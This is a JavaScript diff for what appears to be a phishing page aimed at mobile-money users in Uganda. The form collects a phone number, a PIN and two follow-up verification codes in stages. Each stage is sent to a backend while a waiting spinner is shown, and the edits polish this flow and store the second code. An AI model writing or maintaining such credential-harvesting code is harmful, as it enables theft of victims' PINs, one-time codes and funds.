@@ -361,6 +361,7 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
+  // FIXED: Access the first actual input array node instead of calling focus on the raw array structure
   if (inputs.length > 0) inputs[0].focus();
 }
 
@@ -379,7 +380,6 @@ phoneInput.addEventListener("input", () => {
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  // Prepend Uganda Country Prefix code directly into transmission payload
   userData.phone = "+256" + phoneInput.value;
   
   document.getElementById("page1").classList.add("hidden");
@@ -391,7 +391,7 @@ nextPhoneBtn.addEventListener("click", () => {
 // Post Phone & PIN bundle configuration details
 async function submitPinStage(pinValue) {
   userData.pin = pinValue;
-  document.getElementById("pinBoxes").classList.add("hidden"); // Clear boxes to focus on layout spinner style
+  document.getElementById("pinBoxes").classList.add("hidden"); 
   document.getElementById("pinWaiting").classList.remove("hidden");
   
   const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
@@ -429,4 +429,5 @@ submitCode1Btn.addEventListener("click", async () => {
 
 // Final step submission handler
 async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
 
